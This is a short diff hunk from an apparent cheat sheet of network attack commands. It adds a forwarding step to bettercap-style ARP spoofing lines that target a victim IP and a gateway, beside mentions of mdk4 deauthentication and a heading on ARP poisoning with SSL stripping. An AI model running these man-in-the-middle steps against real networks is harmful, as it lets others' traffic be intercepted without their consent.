@@ -484,7 +484,7 @@ deauth using  mdk4
   * set arp.spoof.targets 192.victim_ip, 192.gateway_ip
   * net.probe on
   * arp.spoof on
-  * 
+  * arp.spoof enable forwarding (std_out for results) 
 
 ----------------------------------------------------[ARP-POISON+SSL_SRIP]---------------------------------------------
 -->[ARP-Poison]
